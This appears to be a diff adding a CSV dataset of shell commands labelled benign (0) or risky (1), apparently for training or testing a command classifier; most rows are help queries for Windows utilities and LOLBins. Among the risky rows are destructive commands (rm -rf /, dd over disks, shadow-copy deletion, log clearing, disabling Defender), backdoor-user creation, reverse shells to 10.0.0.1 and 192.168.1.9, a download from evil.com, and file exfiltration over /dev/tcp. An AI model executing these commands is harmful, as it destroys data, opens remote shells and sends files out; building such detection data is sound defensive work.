@@ -1,0 +1,1577 @@
+command,label
+ASSOC /?,0
+help assoc,0
+ATTRIB /?,0
+help attrib,0
+BCDEDIT /?,1
+help bcdedit,1
+bcdedit /enum,1
+bcdedit /enum all,1
+bcdedit /v,1
+BREAK /?,0
+help break,0
+CACLS /?,1
+help cacls,1
+cacls C:\Windows,1
+cacls C:\Windows\System32,1
+icacls C:\Windows,1
+icacls C:\Windows\System32,1
+CALL /?,0
+help call,0
+CD /?,0
+help cd,0
+CHCP /?,0
+help chcp,0
+CHDIR /?,0
+help chdir,0
+CHKDSK /?,0
+help chkdsk,0
+CHKNTFS /?,0
+help chkntfs,0
+CLS /?,0
+help cls,0
+CMD /?,0
+help cmd,0
+COLOR /?,0
+help color,0
+COMP /?,0
+help comp,0
+COMPACT /?,0
+help compact,0
+CONVERT /?,0
+help convert,0
+COPY /?,0
+help copy,0
+DATE /?,0
+help date,0
+date /t,0
+date,0
+DEL /?,0
+help del,0
+DIR /?,0
+help dir,0
+DISKPART /?,0
+help diskpart,0
+DOSKEY /?,0
+help doskey,0
+DRIVERQUERY /?,0
+help driverquery,0
+ECHO /?,0
+help echo,0
+ENDLOCAL /?,0
+help endlocal,0
+ERASE /?,0
+help erase,0
+EXIT /?,0
+help exit,0
+FC /?,0
+help fc,0
+FIND /?,0
+help find,0
+FINDSTR /?,0
+help findstr,0
+FOR /?,0
+help for,0
+FORMAT /?,0
+help format,0
+FSUTIL /?,0
+help fsutil,0
+FTYPE /?,0
+help ftype,0
+GOTO /?,0
+help goto,0
+GPRESULT /?,0
+help gpresult,0
+HELP /?,0
+help help,0
+ICACLS /?,1
+help icacls,1
+IF /?,0
+help if,0
+LABEL /?,0
+help label,0
+MD /?,0
+help md,0
+MKDIR /?,0
+help mkdir,0
+MKLINK /?,0
+help mklink,0
+MODE /?,0
+help mode,0
+MORE /?,0
+help more,0
+MOVE /?,0
+help move,0
+OPENFILES /?,0
+help openfiles,0
+PATH /?,0
+help path,0
+PAUSE /?,0
+help pause,0
+POPD /?,0
+help popd,0
+PRINT /?,0
+help print,0
+PROMPT /?,0
+help prompt,0
+PUSHD /?,0
+help pushd,0
+RD /?,0
+help rd,0
+RECOVER /?,0
+help recover,0
+REM /?,0
+help rem,0
+REN /?,0
+help ren,0
+RENAME /?,0
+help rename,0
+REPLACE /?,0
+help replace,0
+RMDIR /?,0
+help rmdir,0
+ROBOCOPY /?,0
+help robocopy,0
+SC /?,1
+help sc,1
+sc query,1
+sc query type= service,1
+SCHTASKS /?,1
+help schtasks,1
+schtasks /query,1
+schtasks /query /fo LIST,1
+SET /?,0
+help set,0
+SETLOCAL /?,0
+help setlocal,0
+SHIFT /?,0
+help shift,0
+SHUTDOWN /?,0
+help shutdown,0
+SORT /?,0
+help sort,0
+START /?,0
+help start,0
+SUBST /?,0
+help subst,0
+SYSTEMINFO /?,0
+help systeminfo,0
+TASKKILL /?,1
+help taskkill,1
+TASKLIST /?,0
+help tasklist,0
+TIME /?,0
+help time,0
+time /t,0
+time,0
+TITLE /?,0
+help title,0
+TREE /?,0
+help tree,0
+TYPE /?,0
+help type,0
+VER /?,0
+help ver,0
+VERIFY /?,0
+help verify,0
+VOL /?,0
+help vol,0
+WMIC /?,1
+help wmic,1
+XCOPY /?,0
+help xcopy,0
+dir,0
+dir /b,0
+cd C:\,0
+cd ..,0
+echo hello,0
+type README.txt,0
+ipconfig,0
+ipconfig /all,0
+ping 8.8.8.8,0
+whoami,0
+systeminfo,0
+tasklist,0
+dir /a,0
+dir /w,0
+cd,0
+cd \,0
+echo test,0
+echo hello world,0
+type file.txt,0
+more file.txt,0
+cls,0
+ver,0
+help,0
+hostname,0
+netstat -an,0
+tracert google.com,0
+set,0
+path,0
+tree,0
+assoc,0
+where python,0
+"find ""test"" file.txt",0
+findstr error log.txt,0
+fc file1.txt file2.txt,0
+sort file.txt,0
+wmic cpu get name,0
+wmic os get caption,0
+schtasks /query,0
+net use,0
+net view,0
+net user,0
+reg query HKLM\Software,0
+powershell Get-Process,0
+powershell Get-Service,0
+ls,0
+ls -l,0
+ls -la,0
+pwd,0
+uname -a,0
+uptime,0
+history,0
+last,0
+env,0
+df -h,0
+free -m,0
+top,0
+ps aux,0
+jobs,0
+clear,0
+lsblk,0
+mount,0
+stat file.txt,0
+du -h,0
+wc -l file.txt,0
+head file.txt,0
+tail file.txt,0
+less file.txt,0
+cat file.txt,0
+grep root /etc/passwd,0
+awk '{print $1}' file.txt,0
+"sed -n '1,10p' file.txt",0
+which python,0
+whereis python,0
+echo $PATH,0
+TRUE,0
+exit,0
+rm -rf /,1
+rm -rf *,1
+rm -rf /home,1
+rm -rf /var/log,1
+del /f /q *,1
+del C:\Windows\System32\*,1
+format C:,1
+format D:,1
+mkfs.ext4 /dev/sda1,1
+mkfs /dev/sdb,1
+dd if=/dev/zero of=/dev/sda,1
+dd if=/dev/null of=/dev/sda,1
+shutdown -h now,1
+shutdown -r now,1
+reboot,1
+poweroff,1
+halt,1
+init 0,1
+init 6,1
+iptables -F,1
+iptables -X,1
+iptables -P INPUT ACCEPT,1
+ufw disable,1
+systemctl stop ssh,1
+systemctl disable ssh,1
+service ssh stop,1
+kill -9 1,1
+killall sshd,1
+killall -9 bash,1
+useradd hacker,1
+userdel root,1
+usermod -aG sudo hacker,1
+passwd root,1
+passwd hacker,1
+chown root:root /etc/passwd,1
+chmod 777 /etc/passwd,1
+chmod -R 777 /,1
+chmod 000 /etc/shadow,1
+"echo """" > /etc/passwd",1
+"echo """" > /etc/shadow",1
+cat /etc/shadow,1
+cat /etc/passwd,1
+cp /bin/bash /tmp/rootbash,1
+nc -lvp 4444,1
+nc -e /bin/bash 10.0.0.1 4444,1
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,1
+powershell Invoke-WebRequest http://evil.com/p.ps1,1
+powershell Invoke-Expression,1
+powershell Set-MpPreference -DisableRealtimeMonitoring $true,1
+powershell Add-MpPreference -ExclusionPath C:\,1
+sc stop WinDefend,1
+sc delete WinDefend,1
+net stop WinDefend,1
+net user hacker pass123 /add,1
+net localgroup administrators hacker /add,1
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run,1
+reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f,1
+schtasks /create /sc onlogon /tn backdoor,1
+schtasks /delete /tn backdoor /f,1
+bcdedit /set {default} safeboot minimal,1
+vssadmin delete shadows /all /quiet,1
+wevtutil cl security,1
+wevtutil cl system,1
+wevtutil cl application,1
+history -c,1
+unset HISTFILE,1
+export HISTFILE=/dev/null,1
+iscsicpl.exe /help,1
+winget.exe /help,1
+extrac32.exe /help,1
+head -n 20 log.txt,0
+findstr /i error log.txt,0
+vsdiagnostics.exe /help,1
+tracert 8.8.8.8,0
+wfc.exe /v,1
+dump64.exe -?,1
+addinutil.exe /?,1
+rpcping.exe /v,1
+scriptrunner.exe /?,1
+id,0
+diantz.exe -?,1
+fsianycpu.exe -?,1
+syncappvpublishingserver.exe -?,1
+change.exe /v,1
+tasklist /svc,0
+aspnet_compiler.exe /v,1
+cat README.md,0
+reset.exe /help,1
+appcert.exe /?,1
+adplus.exe /help,1
+grep -i error log.txt,0
+rpcping.exe /help,1
+ieexec.exe /v,1
+eudcedit.exe /v,1
+msaccess.exe /help,1
+jsc.exe /?,1
+dumpminitool.exe /help,1
+top -b -n 1,0
+finger.exe /v,1
+certoc.exe -?,1
+dnx.exe /v,1
+devicecredentialdeployment.exe /v,1
+openconsole.exe /v,1
+infdefaultinstall.exe /v,1
+winword.exe /?,1
+reg.exe /v,1
+mavinject.exe -?,1
+wfc.exe /?,1
+microsoft.workflow.compiler.exe /?,1
+dnx.exe /help,1
+pnputil.exe /v,1
+dump64.exe /v,1
+pixtool.exe -?,1
+free -h,0
+tail -n 50 log.txt,0
+onedrivestandaloneupdater.exe /v,1
+certutil.exe /help,1
+rdrleakdiag.exe /v,1
+bcp.exe /v,1
+configsecuritypolicy.exe /help,1
+presentationhost.exe /help,1
+syncappvpublishingserver.exe /help,1
+forfiles.exe /help,1
+sqldumper.exe /help,1
+xsd.exe /v,1
+msiexec.exe /help,1
+msedgewebview2.exe -?,1
+eventvwr.exe /v,1
+bginfo.exe -?,1
+update.exe -?,1
+control.exe -?,1
+printbrm.exe -?,1
+testwindowremoteagent.exe -?,1
+wfmformat.exe /help,1
+mavinject.exe /?,1
+dotnet.exe /v,1
+ssh.exe -?,1
+schtasks.exe /?,1
+onedrivestandaloneupdater.exe /?,1
+atbroker.exe /?,1
+appvlp.exe -?,1
+sqldumper.exe /?,1
+findstr.exe -?,1
+agentexecutor.exe -?,1
+intellitrace.exe /?,1
+csi.exe /v,1
+diantz.exe /v,1
+sqlps.exe /?,1
+dnx.exe -?,1
+diskshadow.exe -?,1
+findstr.exe /?,1
+vsiisexelauncher.exe -?,1
+dxcap.exe /?,1
+dotnet.exe /?,1
+mpiexec.exe /help,1
+appcert.exe /help,1
+rdrleakdiag.exe /help,1
+xbootmgrsleep.exe /v,1
+appvlp.exe /?,1
+syncappvpublishingserver.exe /v,1
+rdrleakdiag.exe /?,1
+cmd.exe /help,1
+"powershell -NoProfile -Command ""Get-Service""",0
+pcwrun.exe -?,1
+intellitrace.exe /v,1
+colorcpl.exe /?,1
+reset.exe /v,1
+applauncher.exe -?,1
+infdefaultinstall.exe -?,1
+expand.exe /v,1
+configsecuritypolicy.exe /?,1
+vsls-agent.exe -?,1
+wbadmin.exe -?,1
+pcwrun.exe /v,1
+fsianycpu.exe /v,1
+ilasm.exe /help,1
+remote.exe -?,1
+atbroker.exe /help,1
+dnscmd.exe /?,1
+mpiexec.exe /v,1
+certoc.exe /help,1
+dnx.exe /?,1
+certutil.exe /v,1
+tracker.exe /v,1
+extrac32.exe -?,1
+ilasm.exe /v,1
+computerdefaults.exe -?,1
+rundll32.exe /v,1
+workfolders.exe /help,1
+winfile.exe /help,1
+certreq.exe -?,1
+cmdl32.exe /v,1
+rasautou.exe -?,1
+appvlp.exe /help,1
+diskshadow.exe /?,1
+fltmc.exe /v,1
+vslaunchbrowser.exe /v,1
+forfiles.exe -?,1
+presentationhost.exe /?,1
+reg.exe /help,1
+xsd.exe /?,1
+tttracer.exe /help,1
+pixtool.exe /v,1
+fltmc.exe -?,1
+imewdbld.exe /help,1
+msedge_proxy.exe -?,1
+wmic.exe /?,1
+bginfo.exe /help,1
+dir /s,0
+sftp.exe /help,1
+mshta.exe /help,1
+unregmp2.exe /?,1
+msconfig.exe /help,1
+testwindowremoteagent.exe /?,1
+rasautou.exe /v,1
+appcert.exe -?,1
+installutil.exe /v,1
+teams.exe /v,1
+sqldumper.exe -?,1
+ssh.exe /help,1
+ssh.exe /v,1
+squirrel.exe -?,1
+dumpminitool.exe -?,1
+msxsl.exe /?,1
+replace.exe -?,1
+wt.exe /?,1
+rcsi.exe /?,1
+mavinject.exe /help,1
+mftrace.exe /help,1
+appinstaller.exe /?,1
+cmdl32.exe /?,1
+wbemtest.exe /help,1
+iscsicpl.exe /v,1
+excel.exe -?,1
+wfc.exe -?,1
+certreq.exe /v,1
+msbuild.exe /v,1
+pcwrun.exe /help,1
+winget.exe /v,1
+cdb.exe /?,1
+devinit.exe /v,1
+winfile.exe /v,1
+wsl.exe /?,1
+wab.exe /help,1
+wbemtest.exe -?,1
+sqltoolsps.exe -?,1
+excel.exe /help,1
+acccheckconsole.exe -?,1
+msaccess.exe /v,1
+vshadow.exe /v,1
+openconsole.exe -?,1
+wsl.exe /v,1
+regini.exe /v,1
+msedge.exe -?,1
+vstest.console.exe /help,1
+ecmangen.exe /help,1
+reset.exe /?,1
+fsi.exe /?,1
+vbc.exe /?,1
+xwizard.exe /help,1
+visio.exe /v,1
+fsi.exe -?,1
+bginfo.exe /v,1
+at.exe -?,1
+microsoft.nodejstools.pressanykey.exe /v,1
+msiexec.exe /v,1
+extrac32.exe /?,1
+vsls-agent.exe /?,1
+diskshadow.exe /v,1
+mpcmdrun.exe /help,1
+wsreset.exe /v,1
+msedge.exe /?,1
+runonce.exe /?,1
+addinutil.exe -?,1
+defaultpack.exe /v,1
+print.exe -?,1
+wfmformat.exe /?,1
+mmc.exe -?,1
+fsianycpu.exe /help,1
+explorer.exe /?,1
+openconsole.exe /help,1
+regedit.exe /?,1
+replace.exe /?,1
+ngen.exe /?,1
+powerpnt.exe /help,1
+devtunnel.exe /?,1
+offlinescannershell.exe /?,1
+iediagcmd.exe /?,1
+dump64.exe /?,1
+stordiag.exe /v,1
+cmdkey.exe /v,1
+mpiexec.exe -?,1
+visio.exe -?,1
+change.exe -?,1
+addinutil.exe /v,1
+csc.exe /?,1
+dump64.exe /help,1
+wsreset.exe -?,1
+dtutil.exe /?,1
+vsjitdebugger.exe /v,1
+mftrace.exe -?,1
+hh.exe /help,1
+conhost.exe /help,1
+windbg.exe /v,1
+wbadmin.exe /help,1
+devtunnel.exe /help,1
+extexport.exe -?,1
+scriptrunner.exe /v,1
+msdeploy.exe -?,1
+forfiles.exe /?,1
+pcalua.exe /v,1
+conhost.exe /?,1
+ntsd.exe /v,1
+installutil.exe /help,1
+at.exe /v,1
+vsjitdebugger.exe /?,1
+xbootmgr.exe -?,1
+wuauclt.exe /v,1
+provlaunch.exe /v,1
+vbc.exe /v,1
+cmdkey.exe -?,1
+excel.exe /v,1
+bitsadmin.exe /?,1
+bash.exe -?,1
+sftp.exe /v,1
+expand.exe /?,1
+msedge.exe /help,1
+bcp.exe /?,1
+ftp.exe -?,1
+microsoft.nodejstools.pressanykey.exe /help,1
+makecab.exe /help,1
+"powershell -NoProfile -Command ""Get-Process""",0
+esentutl.exe /?,1
+schtasks.exe /help,1
+rundll32.exe /?,1
+visio.exe /help,1
+ldifde.exe -?,1
+ngen.exe /help,1
+regasm.exe /?,1
+datasvcutil.exe -?,1
+pktmon.exe -?,1
+workfolders.exe -?,1
+certreq.exe /?,1
+pnputil.exe /help,1
+acccheckconsole.exe /v,1
+squirrel.exe /v,1
+msaccess.exe -?,1
+explorer.exe -?,1
+devtunnel.exe -?,1
+pktmon.exe /help,1
+extrac32.exe /v,1
+pktmon.exe /v,1
+certutil.exe /?,1
+iediagcmd.exe /v,1
+fsutil.exe /help,1
+rasautou.exe /help,1
+regini.exe -?,1
+msohtmed.exe /help,1
+intellitrace.exe -?,1
+extexport.exe /?,1
+tar.exe /help,1
+msdt.exe -?,1
+appinstaller.exe /v,1
+hh.exe /?,1
+dnscmd.exe -?,1
+ieexec.exe -?,1
+dfsvc.exe /v,1
+cscript.exe /?,1
+dxcap.exe /v,1
+netsh.exe /v,1
+replace.exe /help,1
+makecab.exe /?,1
+wt.exe /help,1
+colorcpl.exe -?,1
+cmd.exe -?,1
+register-cimprovider.exe /?,1
+ecmangen.exe /?,1
+rpcping.exe -?,1
+expand.exe /help,1
+wlrmdr.exe /?,1
+bash.exe /v,1
+finger.exe /help,1
+netsh.exe -?,1
+csc.exe -?,1
+provlaunch.exe -?,1
+esentutl.exe -?,1
+datasvcutil.exe /?,1
+hh.exe -?,1
+mspub.exe /help,1
+wlrmdr.exe /v,1
+msedge.exe /v,1
+change.exe /?,1
+createdump.exe -?,1
+ie4uinit.exe /help,1
+ntdsutil.exe /help,1
+explorer.exe /v,1
+jsc.exe /v,1
+mshta.exe /v,1
+mspub.exe -?,1
+netsh.exe /help,1
+microsoft.nodejstools.pressanykey.exe /?,1
+update.exe /v,1
+unregmp2.exe /help,1
+msdt.exe /help,1
+colorcpl.exe /v,1
+bitsadmin.exe -?,1
+offlinescannershell.exe /help,1
+applauncher.exe /v,1
+unregmp2.exe -?,1
+reg.exe -?,1
+query.exe /v,1
+ntdsutil.exe /v,1
+runscripthelper.exe /?,1
+defaultpack.exe -?,1
+sqlps.exe -?,1
+wlrmdr.exe -?,1
+regasm.exe /help,1
+setres.exe -?,1
+dsdbutil.exe /?,1
+adplus.exe /?,1
+odbcconf.exe -?,1
+verclsid.exe /v,1
+scriptrunner.exe -?,1
+windbg.exe -?,1
+cipher.exe -?,1
+xbootmgrsleep.exe /?,1
+tracker.exe /?,1
+regsvr32.exe /?,1
+offlinescannershell.exe /v,1
+coregen.exe /v,1
+pcalua.exe /help,1
+powerpnt.exe /?,1
+bitsadmin.exe /help,1
+microsoft.workflow.compiler.exe /help,1
+rasautou.exe /?,1
+datasvcutil.exe /v,1
+dnscmd.exe /help,1
+dotnet.exe /help,1
+iediagcmd.exe /help,1
+installutil.exe -?,1
+dfsvc.exe /help,1
+desktopimgdownldr.exe -?,1
+provlaunch.exe /help,1
+eventvwr.exe /help,1
+devinit.exe /help,1
+tttracer.exe /?,1
+cipher.exe /v,1
+dumpminitool.exe /?,1
+wfmformat.exe /v,1
+coregen.exe -?,1
+settingsynchost.exe /v,1
+devinit.exe /?,1
+atbroker.exe /v,1
+vsls-agent.exe /help,1
+eventvwr.exe -?,1
+ftp.exe /v,1
+customshellhost.exe /v,1
+rcsi.exe -?,1
+runexehelper.exe /?,1
+psr.exe -?,1
+msedgewebview2.exe /help,1
+devtoolslauncher.exe /help,1
+devinit.exe -?,1
+msohtmed.exe /v,1
+cmdkey.exe /?,1
+gpscript.exe -?,1
+vshadow.exe -?,1
+acccheckconsole.exe /help,1
+at.exe /?,1
+winget.exe -?,1
+syncappvpublishingserver.exe /?,1
+pnputil.exe -?,1
+esentutl.exe /v,1
+ecmangen.exe -?,1
+presentationhost.exe /v,1
+xsd.exe -?,1
+devtoolslauncher.exe /?,1
+csi.exe /?,1
+wscript.exe /help,1
+gpscript.exe /v,1
+applauncher.exe /help,1
+atbroker.exe -?,1
+ieexec.exe /help,1
+cmstp.exe /help,1
+runexehelper.exe /help,1
+wsreset.exe /?,1
+sqldumper.exe /v,1
+tar.exe /v,1
+configsecuritypolicy.exe -?,1
+cipher.exe /?,1
+imewdbld.exe -?,1
+aspnet_compiler.exe /help,1
+forfiles.exe /v,1
+csi.exe /help,1
+bitsadmin.exe /v,1
+xbootmgr.exe /v,1
+print.exe /v,1
+rpcping.exe /?,1
+cmdl32.exe /help,1
+pcalua.exe -?,1
+stordiag.exe /help,1
+pktmon.exe /?,1
+teams.exe -?,1
+tracker.exe -?,1
+vshadow.exe /?,1
+rcsi.exe /v,1
+cmd.exe /v,1
+wab.exe -?,1
+testwindowremoteagent.exe /v,1
+winproj.exe -?,1
+cdb.exe -?,1
+xbootmgrsleep.exe -?,1
+vstest.console.exe -?,1
+devtoolslauncher.exe -?,1
+regini.exe /?,1
+runexehelper.exe /v,1
+procdump.exe -?,1
+odbcconf.exe /?,1
+fsianycpu.exe /?,1
+wbemtest.exe /v,1
+printbrm.exe /v,1
+imewdbld.exe /v,1
+sc.exe -?,1
+certoc.exe /v,1
+vsjitdebugger.exe /help,1
+runscripthelper.exe /help,1
+msxsl.exe /help,1
+setres.exe /v,1
+mmc.exe /help,1
+iediagcmd.exe -?,1
+te.exe /v,1
+dsdbutil.exe /help,1
+register-cimprovider.exe /v,1
+finger.exe /?,1
+update.exe /?,1
+jsc.exe -?,1
+diantz.exe /?,1
+provlaunch.exe /?,1
+te.exe /?,1
+mspub.exe /?,1
+fltmc.exe /?,1
+wmic.exe /help,1
+devicecredentialdeployment.exe /help,1
+agentexecutor.exe /v,1
+imewdbld.exe /?,1
+cdb.exe /help,1
+regsvr32.exe -?,1
+visio.exe /?,1
+winword.exe /v,1
+agentexecutor.exe /?,1
+control.exe /v,1
+visualuiaverifynative.exe -?,1
+onedrivestandaloneupdater.exe /help,1
+presentationhost.exe -?,1
+cmdl32.exe -?,1
+wscript.exe /?,1
+protocolhandler.exe /v,1
+stordiag.exe -?,1
+devicecredentialdeployment.exe -?,1
+mspub.exe /v,1
+powerpnt.exe /v,1
+ntdsutil.exe -?,1
+findstr.exe /help,1
+sc.exe /?,1
+bcp.exe -?,1
+rundll32.exe -?,1
+sc.exe /v,1
+cmstp.exe -?,1
+winfile.exe -?,1
+printbrm.exe /help,1
+wscript.exe /v,1
+sqltoolsps.exe /v,1
+computerdefaults.exe /v,1
+hh.exe /v,1
+csi.exe -?,1
+msdeploy.exe /v,1
+rcsi.exe /help,1
+pcwrun.exe /?,1
+vslaunchbrowser.exe /?,1
+diskshadow.exe /help,1
+protocolhandler.exe -?,1
+wlrmdr.exe /help,1
+coregen.exe /?,1
+fsutil.exe /?,1
+mavinject.exe /v,1
+infdefaultinstall.exe /?,1
+vsiisexelauncher.exe /help,1
+certutil.exe -?,1
+vbc.exe /help,1
+regsvcs.exe -?,1
+vstest.console.exe /v,1
+rdrleakdiag.exe -?,1
+regsvcs.exe /help,1
+dfsvc.exe /?,1
+wscript.exe -?,1
+extexport.exe /v,1
+regedit.exe /v,1
+regedit.exe /help,1
+regsvr32.exe /help,1
+wuauclt.exe -?,1
+sftp.exe /?,1
+update.exe /help,1
+fsi.exe /v,1
+verclsid.exe /help,1
+vslaunchbrowser.exe -?,1
+certoc.exe /?,1
+cmstp.exe /?,1
+query.exe /help,1
+csc.exe /v,1
+vshadow.exe /help,1
+msxsl.exe -?,1
+msbuild.exe /help,1
+print.exe /help,1
+xwizard.exe /?,1
+cmdkey.exe /help,1
+odbcconf.exe /help,1
+computerdefaults.exe /?,1
+wab.exe /v,1
+msedgewebview2.exe /v,1
+wt.exe -?,1
+register-cimprovider.exe /help,1
+testwindowremoteagent.exe /help,1
+setres.exe /?,1
+mftrace.exe /v,1
+ftp.exe /help,1
+tttracer.exe -?,1
+ttdinject.exe /help,1
+netsh.exe /?,1
+settingsynchost.exe /?,1
+vsdiagnostics.exe /v,1
+devtoolslauncher.exe /v,1
+desktopimgdownldr.exe /help,1
+eudcedit.exe /help,1
+msiexec.exe -?,1
+vstest.console.exe /?,1
+cmd.exe /?,1
+mftrace.exe /?,1
+appinstaller.exe -?,1
+runexehelper.exe -?,1
+pixtool.exe /help,1
+ttdinject.exe /v,1
+tracker.exe /help,1
+msconfig.exe -?,1
+dxcap.exe -?,1
+control.exe /help,1
+bash.exe /help,1
+verclsid.exe /?,1
+at.exe /help,1
+runonce.exe /v,1
+adplus.exe -?,1
+mshta.exe /?,1
+msohtmed.exe -?,1
+ie4uinit.exe -?,1
+ssh.exe /?,1
+ie4uinit.exe /?,1
+procdump.exe /?,1
+msedgewebview2.exe /?,1
+psr.exe /v,1
+sc.exe /help,1
+print.exe /?,1
+wbadmin.exe /v,1
+tar.exe -?,1
+esentutl.exe /help,1
+mpcmdrun.exe -?,1
+msdt.exe /v,1
+procdump.exe /v,1
+psr.exe /help,1
+runscripthelper.exe /v,1
+microsoft.workflow.compiler.exe -?,1
+msedge_proxy.exe /help,1
+teams.exe /help,1
+ngen.exe -?,1
+regsvcs.exe /v,1
+vsjitdebugger.exe -?,1
+ldifde.exe /v,1
+wfmformat.exe -?,1
+msdt.exe /?,1
+mpcmdrun.exe /?,1
+diantz.exe /help,1
+computerdefaults.exe /help,1
+makecab.exe /v,1
+wuauclt.exe /help,1
+stordiag.exe /?,1
+cmstp.exe /v,1
+msbuild.exe /?,1
+offlinescannershell.exe -?,1
+remote.exe /?,1
+customshellhost.exe -?,1
+wmic.exe /v,1
+vsdiagnostics.exe /?,1
+regasm.exe /v,1
+ntdsutil.exe /?,1
+adplus.exe /v,1
+winproj.exe /v,1
+intellitrace.exe /help,1
+printbrm.exe /?,1
+msiexec.exe /?,1
+cscript.exe /v,1
+workfolders.exe /v,1
+schtasks.exe /v,1
+eudcedit.exe -?,1
+configsecuritypolicy.exe /v,1
+wfc.exe /help,1
+regini.exe /help,1
+appinstaller.exe /help,1
+msdeploy.exe /help,1
+bcp.exe /help,1
+replace.exe /v,1
+fsutil.exe /v,1
+ttdinject.exe -?,1
+acccheckconsole.exe /?,1
+iscsicpl.exe -?,1
+msedge_proxy.exe /?,1
+ilasm.exe -?,1
+coregen.exe /help,1
+scriptrunner.exe /help,1
+pcalua.exe /?,1
+xwizard.exe -?,1
+wt.exe /v,1
+msaccess.exe /?,1
+customshellhost.exe /?,1
+reg.exe /?,1
+sqlps.exe /help,1
+te.exe /help,1
+protocolhandler.exe /?,1
+dsdbutil.exe -?,1
+excel.exe /?,1
+xsd.exe /help,1
+microsoft.nodejstools.pressanykey.exe -?,1
+ngen.exe /v,1
+visualuiaverifynative.exe /help,1
+dtutil.exe /v,1
+tar.exe /?,1
+createdump.exe /v,1
+sftp.exe -?,1
+te.exe -?,1
+aspnet_compiler.exe /?,1
+explorer.exe /help,1
+wab.exe /?,1
+settingsynchost.exe /help,1
+query.exe /?,1
+dnscmd.exe /v,1
+wbemtest.exe /?,1
+gpscript.exe /?,1
+ldifde.exe /?,1
+regsvcs.exe /?,1
+mshta.exe -?,1
+wbadmin.exe /?,1
+certreq.exe /help,1
+verclsid.exe -?,1
+msbuild.exe -?,1
+ntsd.exe /?,1
+ldifde.exe /help,1
+windbg.exe /help,1
+vsiisexelauncher.exe /?,1
+rundll32.exe /help,1
+register-cimprovider.exe -?,1
+setres.exe /help,1
+ntsd.exe /help,1
+squirrel.exe /?,1
+teams.exe /?,1
+jsc.exe /help,1
+defaultpack.exe /?,1
+devtunnel.exe /v,1
+makecab.exe -?,1
+eventvwr.exe /?,1
+ttdinject.exe /?,1
+regedit.exe -?,1
+sqltoolsps.exe /help,1
+microsoft.workflow.compiler.exe /v,1
+findstr.exe /v,1
+agentexecutor.exe /help,1
+cscript.exe -?,1
+cdb.exe /v,1
+runscripthelper.exe -?,1
+mpcmdrun.exe /v,1
+pixtool.exe /?,1
+customshellhost.exe /help,1
+msconfig.exe /?,1
+desktopimgdownldr.exe /v,1
+openconsole.exe /?,1
+bginfo.exe /?,1
+visualuiaverifynative.exe /v,1
+settingsynchost.exe -?,1
+winword.exe /help,1
+fltmc.exe /help,1
+applauncher.exe /?,1
+devicecredentialdeployment.exe /?,1
+csc.exe /help,1
+extexport.exe /help,1
+windbg.exe /?,1
+msdeploy.exe /?,1
+protocolhandler.exe /help,1
+dumpminitool.exe /v,1
+runonce.exe -?,1
+vslaunchbrowser.exe /help,1
+appcert.exe /v,1
+colorcpl.exe /help,1
+cipher.exe /help,1
+dotnet.exe -?,1
+createdump.exe /help,1
+conhost.exe -?,1
+wsl.exe -?,1
+change.exe /help,1
+dtutil.exe /help,1
+xwizard.exe /v,1
+tttracer.exe /v,1
+vsls-agent.exe /v,1
+wsl.exe /help,1
+mmc.exe /?,1
+visualuiaverifynative.exe /?,1
+fsi.exe /help,1
+powerpnt.exe -?,1
+regsvr32.exe /v,1
+appvlp.exe /v,1
+xbootmgr.exe /help,1
+ftp.exe /?,1
+onedrivestandaloneupdater.exe -?,1
+workfolders.exe /?,1
+msxsl.exe /v,1
+xbootmgrsleep.exe /help,1
+ie4uinit.exe /v,1
+squirrel.exe /help,1
+desktopimgdownldr.exe /?,1
+vsiisexelauncher.exe /v,1
+procdump.exe /help,1
+dfsvc.exe -?,1
+msohtmed.exe /?,1
+unregmp2.exe /v,1
+control.exe /?,1
+xbootmgr.exe /?,1
+fsutil.exe -?,1
+remote.exe /help,1
+ilasm.exe /?,1
+msconfig.exe /v,1
+sqltoolsps.exe /?,1
+remote.exe /v,1
+vsdiagnostics.exe -?,1
+winget.exe /?,1
+ntsd.exe -?,1
+ecmangen.exe /v,1
+pnputil.exe /?,1
+conhost.exe /v,1
+finger.exe -?,1
+dsdbutil.exe /v,1
+mpiexec.exe /?,1
+ieexec.exe /?,1
+winfile.exe /?,1
+reset.exe -?,1
+gpscript.exe /help,1
+datasvcutil.exe /help,1
+defaultpack.exe /help,1
+eudcedit.exe /?,1
+vbc.exe -?,1
+expand.exe -?,1
+aspnet_compiler.exe -?,1
+createdump.exe /?,1
+cscript.exe /help,1
+query.exe -?,1
+wmic.exe -?,1
+wuauclt.exe /?,1
+msedge_proxy.exe /v,1
+installutil.exe /?,1
+odbcconf.exe /v,1
+dtutil.exe -?,1
+dxcap.exe /help,1
+psr.exe /?,1
+winproj.exe /help,1
+mmc.exe /v,1
+infdefaultinstall.exe /help,1
+regasm.exe -?,1
+winword.exe -?,1
+iscsicpl.exe /?,1
+bash.exe /?,1
+addinutil.exe /help,1
+wsreset.exe /help,1
+winproj.exe /?,1
+schtasks.exe -?,1
+runonce.exe /help,1
+sqlps.exe /v,1
+findstr /i warning notes.txt,0
+type data.txt,0
+findstr /i network notes.txt,0
+findstr /i success README.txt,0
+type log.txt,0
+findstr /i service log.txt,0
+findstr /i service notes.txt,0
+type notes.txt,0
+findstr /i warning README.txt,0
+findstr /i error notes.txt,0
+findstr /i error README.txt,0
+findstr /i service README.txt,0
+findstr /i warning log.txt,0
+findstr /i network README.txt,0
+findstr /i warning data.txt,0
+findstr /i network log.txt,0
+findstr /i network data.txt,0
+findstr /i success log.txt,0
+findstr /i success notes.txt,0
+findstr /i service data.txt,0
+findstr /i error data.txt,0
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.,1
+start ms-appinstaller://?source={REMOTEURL:.exe},1
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u,1
+"C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}",1
+ATBroker.exe /start malware,1
+"bash.exe -c ""{CMD}""",1
+"bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane""",1
+bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24',1
+bash.exe,1
+bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,1
